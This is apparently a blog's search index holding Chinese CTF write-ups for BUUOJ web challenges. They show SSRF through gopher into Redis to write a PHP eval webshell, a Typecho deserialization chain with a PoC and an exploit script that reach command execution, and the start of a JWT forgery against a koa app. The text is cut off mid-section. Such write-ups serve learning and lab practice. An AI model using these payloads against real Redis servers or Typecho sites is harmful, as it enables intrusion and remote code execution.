<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>buuoj-web02</title>
      <link href="/2020/07/12/buuoj-web02/"/>
      <url>/2020/07/12/buuoj-web02/</url>
      
        <content type="html"><![CDATA[<h1 id="GKCTF2020-EZ三剑客-EzWeb"><a href="#GKCTF2020-EZ三剑客-EzWeb" class="headerlink" title="[GKCTF2020]EZ三剑客-EzWeb"></a>[GKCTF2020]EZ三剑客-EzWeb</h1><p>注释<code>&lt;!--?secret--&gt;</code><br>访问得回显<br><img src="00.png" alt=""><br><em>此处容器有重启过所以ip地址会不同，实际上是一致的</em><br>给了内网ip，就可以考虑ssrf<br>利用burpsuite扫描内网<br><img src="01.png" alt=""><br>线程减小，太快会429<br>(找返回长度明显和其他不一样的包来看)<br>回显<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">被你发现了,但你也许需要试试其他服♂务,就在这台机子上! ...我说的是端口啦1</span><br></pre></td></tr></table></figure></p><p>ip为:173.57.147.11<br>同样的步骤，扫端口，这个时候可能就凸显经验的重要性了…直接猜几个重要端口  </p><blockquote></blockquote><p>sqlserver： 1433<br>MySQL： 3306<br>Oracle ： 1521<br>http： 80<br>https： 443<br>redis： 6379<br>回显<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-ERR wrong number of arguments for &apos;get&apos; command 1</span><br></pre></td></tr></table></figure></p><p>端口是6379</p><p><a href="https://xz.aliyun.com/t/4420#toc-3" target="_blank" rel="noopener">CTF中SSRF的一些trick</a><br><a href="https://www.redteaming.top/2019/07/15/%E6%B5%85%E6%9E%90Redis%E4%B8%ADSSRF%E7%9A%84%E5%88%A9%E7%94%A8/" target="_blank" rel="noopener">浅析Redis中SSRF的利用</a>  </p><blockquote><p>在RESP中，协议的不同部分始终以”\r\n”(CRLF)结束。</p></blockquote><p>利用绝对路径写webshell<br>执行脚本<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#py3</span></span><br><span class="line"><span class="keyword">import</span> urllib.parse</span><br><span class="line">protocol=<span class="string">"gopher://"</span></span><br><span class="line">ip=<span class="string">"173.73.182.11"</span></span><br><span class="line">port=<span class="string">"6379"</span></span><br><span class="line">shell=<span class="string">"\n\n&lt;?php eval($_GET[\"cmd\"]);?&gt;\n\n"</span></span><br><span class="line">filename=<span class="string">"shell.php"</span></span><br><span class="line">path=<span class="string">"/var/www/html"</span></span><br><span class="line">passwd=<span class="string">""</span></span><br><span class="line">cmd=[<span class="string">"flushall"</span>,</span><br><span class="line"> <span class="string">"set 1 &#123;&#125;"</span>.format(shell.replace(<span class="string">" "</span>,<span class="string">"$&#123;IFS&#125;"</span>)),</span><br><span class="line"> <span class="string">"config set dir &#123;&#125;"</span>.format(path),</span><br><span class="line"> <span class="string">"config set dbfilename &#123;&#125;"</span>.format(filename),</span><br><span class="line"> <span class="string">"save"</span></span><br><span class="line"> ]</span><br><span class="line"><span class="keyword">if</span> passwd:</span><br><span class="line">cmd.insert(<span class="number">0</span>,<span class="string">"AUTH &#123;&#125;"</span>.format(passwd))</span><br><span class="line">payload=protocol+ip+<span class="string">":"</span>+port+<span class="string">"/_"</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">redis_format</span><span class="params">(arr)</span>:</span></span><br><span class="line">CRLF=<span class="string">"\r\n"</span></span><br><span class="line">redis_arr = arr.split(<span class="string">" "</span>)</span><br><span class="line">cmd=<span class="string">""</span></span><br><span class="line">cmd+=<span class="string">"*"</span>+str(len(redis_arr))</span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> redis_arr:</span><br><span class="line">cmd+=CRLF+<span class="string">"$"</span>+str(len((x.replace(<span class="string">"$&#123;IFS&#125;"</span>,<span class="string">" "</span>))))+CRLF+x.replace(<span class="string">"$&#123;IFS&#125;"</span>,<span class="string">" "</span>)</span><br><span class="line">cmd+=CRLF</span><br><span class="line"><span class="keyword">return</span> cmd</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">"__main__"</span>:</span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> cmd:</span><br><span class="line">payload += urllib.parse.quote(redis_format(x))</span><br><span class="line"><span class="keyword">print</span> (payload)</span><br></pre></td></tr></table></figure></p><p>得到payload<br><code>gopher://173.73.182.11:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A%2A3%0D%0A%243%0D%0Aset%0D%0A%241%0D%0A1%0D%0A%2431%0D%0A%0A%0A%3C%3Fphp%20eval%28%24_GET%5B%22cmd%22%5D%29%3B%3F%3E%0A%0A%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%243%0D%0Adir%0D%0A%2413%0D%0A/var/www/html%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%2410%0D%0Adbfilename%0D%0A%249%0D%0Ashell.php%0D%0A%2A1%0D%0A%244%0D%0Asave%0D%0A</code><br>读flag文件<br><code>http://173.73.182.11/shell.php?cmd=system(&#39;cat$IFS$9/flag&#39;);</code></p><h1 id="GKCTF2020-EZ三剑客-EzTypecho"><a href="#GKCTF2020-EZ三剑客-EzTypecho" class="headerlink" title="[GKCTF2020]EZ三剑客-EzTypecho"></a>[GKCTF2020]EZ三剑客-EzTypecho</h1><p>给了源码<br><a href="https://cloud.tencent.com/developer/article/1038270" target="_blank" rel="noopener">typecho漏洞分析与HCTF实战</a></p><blockquote></blockquote><p>__destruct()是在对象被销毁的时候自动调用<br>__wakeup()在反序列化的时候自动调用<br>__toString()是在调用对象的时候自动调用。<br>__get()会在读取不可访问的属性的值的时候调用</p><p>在页面尝试，发现<img src="02.png" alt=""></p><p>源码:<br>install.php line231<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_SESSION)) &#123; <span class="keyword">die</span>(<span class="string">'no, you can\'t unserialize it without session QAQ'</span>);&#125;</span><br><span class="line">$config = unserialize(base64_decode(Typecho_Cookie::get(<span class="string">'__typecho_config'</span>)));</span><br><span class="line">Typecho_Cookie::delete(<span class="string">'__typecho_config'</span>);</span><br><span class="line">$db = <span class="keyword">new</span> Typecho_Db($config[<span class="string">'adapter'</span>], $config[<span class="string">'prefix'</span>]);</span><br><span class="line">$db-&gt;addServer($config, Typecho_Db::READ | Typecho_Db::WRITE);</span><br><span class="line">Typecho_Db::set($db);</span><br></pre></td></tr></table></figure></p><p>反序列化利用点↑，跟进get()函数<br>并且这里的<code>$db = new Typecho_Db($config[&#39;adapter&#39;], $config[&#39;prefix&#39;]);</code>调用了对象</p><p>cookie.php line83<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">get</span><span class="params">($key, $default = NULL)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">$key = <span class="keyword">self</span>::$_prefix . $key;</span><br><span class="line">$value = <span class="keyword">isset</span>($_COOKIE[$key]) ? $_COOKIE[$key] : (<span class="keyword">isset</span>($_POST[$key]) ? $_POST[$key] : $default);</span><br><span class="line"><span class="keyword">return</span> is_array($value) ? $default : $value;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>1.cookie值是否存在<br>2.$value是否是一个数组<br>利用cookie或者POST传入<br>注意到在之前的代码中调用过了对象，可以利用<code>__toString()</code><br>接下来全局搜索<code>__toString()</code> 找到可以利用的类(Typecho_Feed())<br>feed.php line284<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;_items <span class="keyword">as</span> $item) &#123;</span><br><span class="line">    $content .= <span class="string">'&lt;item&gt;'</span> . <span class="keyword">self</span>::EOL;</span><br><span class="line">    $content .= <span class="string">'&lt;title&gt;'</span> . htmlspecialchars($item[<span class="string">'title'</span>]) . <span class="string">'&lt;/title&gt;'</span> . <span class="keyword">self</span>::EOL;</span><br><span class="line">    $content .= <span class="string">'&lt;link&gt;'</span> . $item[<span class="string">'link'</span>] . <span class="string">'&lt;/link&gt;'</span> . <span class="keyword">self</span>::EOL;</span><br><span class="line">    $content .= <span class="string">'&lt;guid&gt;'</span> . $item[<span class="string">'link'</span>] . <span class="string">'&lt;/guid&gt;'</span> . <span class="keyword">self</span>::EOL;</span><br><span class="line">    $content .= <span class="string">'&lt;pubDate&gt;'</span> . <span class="keyword">$this</span>-&gt;dateFormat($item[<span class="string">'date'</span>]) . <span class="string">'&lt;/pubDate&gt;'</span> . <span class="keyword">self</span>::EOL;</span><br><span class="line">    <span class="comment">//给师傅们减轻负担QAQ，要加上$item['category'] = array(new Typecho_Request());和$this-&gt;_type防止500</span></span><br><span class="line">    $content .= <span class="string">'&lt;dc:creator&gt;'</span> . htmlspecialchars($item[<span class="string">'author'</span>]-&gt;screenName) . <span class="string">'&lt;/dc:creator&gt;'</span> . <span class="keyword">self</span>::EOL;</span><br></pre></td></tr></table></figure></p><p>注意到<code>$item[&#39;author&#39;]-&gt;screenName</code>,跟进<code>$__items</code></p><p>feed.php line112<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> $_items = <span class="keyword">array</span>();</span><br></pre></td></tr></table></figure></p><p><code>$_items</code>是一个私有变量，由此可以联想到<code>__get()</code>函数<br>当执行<code>$item[&#39;author&#39;]-&gt;screenName</code>时已经用到了这个函数<br>跟进<code>__get()</code>全局搜索，最后可以追溯到(Typecho_Request())<br>request.php line295<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get</span><span class="params">($key, $default = NULL)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">switch</span> (<span class="keyword">true</span>) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;_params[$key]):</span><br><span class="line">            $value = <span class="keyword">$this</span>-&gt;_params[$key];</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="keyword">isset</span>(<span class="keyword">self</span>::$_httpParams[$key]):</span><br><span class="line">            $value = <span class="keyword">self</span>::$_httpParams[$key];</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            $value = $default;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $value = !is_array($value) &amp;&amp; strlen($value) &gt; <span class="number">0</span> ? $value : $default;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;_applyFilter($value);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>再跟进<code>__applyFilter($value)</code><br>request.php line159<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">_applyFilter</span><span class="params">($value)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;_filter) &#123;</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;_filter <span class="keyword">as</span> $filter) &#123;</span><br><span class="line">            $value = is_array($value) ? array_map($filter, $value) :</span><br><span class="line">            call_user_func($filter, $value);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">$this</span>-&gt;_filter = <span class="keyword">array</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> $value;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>注意到这里的<code>call_user_func()</code>，可以执行命令 </p><blockquote><p>//给师傅们减轻负担QAQ，要加上$item[‘category’] = array(new Typecho_Request());和$this-&gt;_type防止500</p></blockquote><p>poc.php<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Typecho_Feed</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">const</span> ATOM1 = <span class="string">'ATOM 1.0'</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> $_type;</span><br><span class="line">    <span class="keyword">private</span> $_items;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;_type = <span class="keyword">$this</span>::ATOM1;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;_items[<span class="number">0</span>] = <span class="keyword">array</span>(</span><br><span class="line">            <span class="string">'category'</span> =&gt; <span class="keyword">array</span>(<span class="keyword">new</span> Typecho_Request()),</span><br><span class="line">            <span class="string">'author'</span> =&gt; <span class="keyword">new</span> Typecho_Request(),</span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Typecho_Request</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $_params = <span class="keyword">array</span>(<span class="string">'screenName'</span>=&gt;<span class="string">'system("cat /flag")'</span>);</span><br><span class="line">    <span class="keyword">private</span> $_filter = <span class="keyword">array</span>(<span class="string">'assert'</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$poc = <span class="keyword">array</span>(</span><br><span class="line">    <span class="string">'adapter'</span> =&gt; <span class="keyword">new</span> Typecho_Feed(),</span><br><span class="line">    <span class="string">'prefix'</span>  =&gt; <span class="string">'typecho_'</span></span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> base64_encode(serialize($poc));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><p>install.php line59<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>($_GET[<span class="string">'finish'</span>]) &amp;&amp; file_exists(__TYPECHO_ROOT_DIR__ . <span class="string">'/config.inc.php'</span>) &amp;&amp; <span class="keyword">empty</span>($_SESSION[<span class="string">'typecho'</span>])) &#123;</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">// 挡掉可能的跨站请求</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">empty</span>($_GET) || !<span class="keyword">empty</span>($_POST)) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">empty</span>($_SERVER[<span class="string">'HTTP_REFERER'</span>])) &#123;</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $parts = parse_url($_SERVER[<span class="string">'HTTP_REFERER'</span>]);</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">empty</span>($parts[<span class="string">'port'</span>])) &#123;</span><br><span class="line">        $parts[<span class="string">'host'</span>] = <span class="string">"&#123;$parts['host']&#125;:&#123;$parts['port']&#125;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">empty</span>($parts[<span class="string">'host'</span>]) || $_SERVER[<span class="string">'HTTP_HOST'</span>] != $parts[<span class="string">'host'</span>]) &#123;</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>所以带上finish参数和Referer<br>同时检测了是否有$__SESSION,但是在文件中session_start()已被注释<br><a href="https://www.php.net/manual/zh/session.upload-progress.php" target="_blank" rel="noopener">Session 上传进度</a><br><img src="04.png" alt=""><br>exp.py<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url=<span class="string">'http://b114cfc5-a3ba-4ce4-be1c-41de9496d3a7.node3.buuoj.cn/install.php?finish=1'</span></span><br><span class="line">files=&#123;<span class="string">'file'</span>:<span class="number">123</span>&#125;</span><br><span class="line">headers=&#123;<span class="string">'cookie'</span>:<span class="string">'PHPSESSID=test;__typecho_config=YToyOntzOjc6ImFkYXB0ZXIiO086MTI6IlR5cGVjaG9fRmVlZCI6Mjp7czoxOToiAFR5cGVjaG9fRmVlZABfdHlwZSI7czo4OiJBVE9NIDEuMCI7czoyMDoiAFR5cGVjaG9fRmVlZABfaXRlbXMiO2E6MTp7aTowO2E6Mjp7czo4OiJjYXRlZ29yeSI7YToxOntpOjA7TzoxNToiVHlwZWNob19SZXF1ZXN0IjoyOntzOjI0OiIAVHlwZWNob19SZXF1ZXN0AF9wYXJhbXMiO2E6MTp7czoxMDoic2NyZWVuTmFtZSI7czoxOToic3lzdGVtKCJjYXQgL2ZsYWciKSI7fXM6MjQ6IgBUeXBlY2hvX1JlcXVlc3QAX2ZpbHRlciI7YToxOntpOjA7czo2OiJhc3NlcnQiO319fXM6NjoiYXV0aG9yIjtPOjE1OiJUeXBlY2hvX1JlcXVlc3QiOjI6e3M6MjQ6IgBUeXBlY2hvX1JlcXVlc3QAX3BhcmFtcyI7YToxOntzOjEwOiJzY3JlZW5OYW1lIjtzOjE5OiJzeXN0ZW0oImNhdCAvZmxhZyIpIjt9czoyNDoiAFR5cGVjaG9fUmVxdWVzdABfZmlsdGVyIjthOjE6e2k6MDtzOjY6ImFzc2VydCI7fX19fX1zOjY6InByZWZpeCI7czo4OiJ0eXBlY2hvXyI7fQ=='</span>,</span><br><span class="line"> <span class="string">'Referer'</span>:<span class="string">'http://b114cfc5-a3ba-4ce4-be1c-41de9496d3a7.node3.buuoj.cn/install.php'</span>&#125;</span><br><span class="line">re=requests.post(url,files=files,headers=headers,data=&#123;<span class="string">"PHP_SESSION_UPLOAD_PROGRESS"</span>: <span class="string">"123"</span>&#125;)</span><br><span class="line">print(re.text)</span><br></pre></td></tr></table></figure></p>]]></content>
      
      
      <categories>
          
          <category> practice </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>buuoj-web01</title>
      <link href="/2020/07/12/buuoj-web01/"/>
      <url>/2020/07/12/buuoj-web01/</url>
      
        <content type="html"><![CDATA[<p>buuoj-wp-web01</p><h1 id="HFCTF2020-EasyLogin"><a href="#HFCTF2020-EasyLogin" class="headerlink" title="[HFCTF2020]EasyLogin"></a>[HFCTF2020]EasyLogin</h1><p><img src="00.png" alt=""><br>注释中写了路径直接填了根目录，所以可能有任意文件读取的漏洞  </p><p>koa框架<br>关于koa的目录结构<br><img src="01.png" alt=""><br><del>图是偷的</del><br>在controllers下的api.js找到关键代码<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> crypto = <span class="built_in">require</span>(<span class="string">'crypto'</span>);</span><br><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">'fs'</span>)</span><br><span class="line"><span class="keyword">const</span> jwt = <span class="built_in">require</span>(<span class="string">'jsonwebtoken'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> APIError = <span class="built_in">require</span>(<span class="string">'../rest'</span>).APIError;</span><br><span class="line"></span><br><span class="line"><span class="built_in">module</span>.exports = &#123;</span><br><span class="line">    <span class="string">'POST /api/register'</span>: <span class="keyword">async</span> (ctx, next) =&gt; &#123;</span><br><span class="line">        <span class="keyword">const</span> &#123;username, password&#125; = ctx.request.body;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!username || username === <span class="string">'admin'</span>)&#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> APIError(<span class="string">'register error'</span>, <span class="string">'wrong username'</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(global.secrets.length &gt; <span class="number">100000</span>) &#123;</span><br><span class="line">            global.secrets = [];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">const</span> secret = crypto.randomBytes(<span class="number">18</span>).toString(<span class="string">'hex'</span>);</span><br><span class="line">        <span class="keyword">const</span> secretid = global.secrets.length;</span><br><span class="line">        global.secrets.push(secret)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">const</span> token = jwt.sign(&#123;secretid, username, password&#125;, secret, &#123;<span class="attr">algorithm</span>: <span class="string">'HS256'</span>&#125;);</span><br><span class="line"></span><br><span class="line">        ctx.rest(&#123;</span><br><span class="line">            token: token</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">await</span> next();</span><br><span class="line">    &#125;,</span><br><span class="line"></span><br><span class="line">    <span class="string">'POST /api/login'</span>: <span class="keyword">async</span> (ctx, next) =&gt; &#123;</span><br><span class="line">        <span class="keyword">const</span> &#123;username, password&#125; = ctx.request.body;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!username || !password) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> APIError(<span class="string">'login error'</span>, <span class="string">'username or password is necessary'</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">const</span> token = ctx.header.authorization || ctx.request.body.authorization || ctx.request.query.authorization;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">const</span> sid = <span class="built_in">JSON</span>.parse(Buffer.from(token.split(<span class="string">'.'</span>)[<span class="number">1</span>], <span class="string">'base64'</span>).toString()).secretid;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">console</span>.log(sid)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(sid === <span class="literal">undefined</span> || sid === <span class="literal">null</span> || !(sid &lt; global.secrets.length &amp;&amp; sid &gt;= <span class="number">0</span>)) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> APIError(<span class="string">'login error'</span>, <span class="string">'no such secret id'</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">const</span> secret = global.secrets[sid];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">const</span> user = jwt.verify(token, secret, &#123;<span class="attr">algorithm</span>: <span class="string">'HS256'</span>&#125;);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">const</span> status = username === user.username &amp;&amp; password === user.password;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(status) &#123;</span><br><span class="line">            ctx.session.username = username;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        ctx.rest(&#123;</span><br><span class="line">            status</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">await</span> next();</span><br><span class="line">    &#125;,</span><br><span class="line"></span><br><span class="line">    <span class="string">'GET /api/flag'</span>: <span class="keyword">async</span> (ctx, next) =&gt; &#123;</span><br><span class="line">        <span class="keyword">if</span>(ctx.session.username !== <span class="string">'admin'</span>)&#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> APIError(<span class="string">'permission error'</span>, <span class="string">'permission denied'</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">const</span> flag = fs.readFileSync(<span class="string">'/flag'</span>).toString();</span><br><span class="line">        ctx.rest(&#123;</span><br><span class="line">            flag</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">await</span> next();</span><br><span class="line">    &#125;,</span><br><span class="line"></span><br><span class="line">    <span class="string">'GET /api/logout'</span>: <span class="keyword">async</span> (ctx, next) =&gt; &#123;</span><br><span class="line">        ctx.session.username = <span class="literal">null</span>;</span><br><span class="line">        ctx.rest(&#123;</span><br><span class="line">            status: <span class="literal">true</span></span><br><span class="line">        &#125;)</span><br><span class="line">        <span class="keyword">await</span> next();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></p><p>需要让username=admin,之后再访问/flag就可以得到flag<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> token = jwt.sign(&#123;secretid, username, password&#125;, secret, &#123;<span class="attr">algorithm</span>: <span class="string">'HS256'</span>&#125;);</span><br></pre></td></tr></table></figure></p><p>jwt伪造</p><p>对于<br><figure 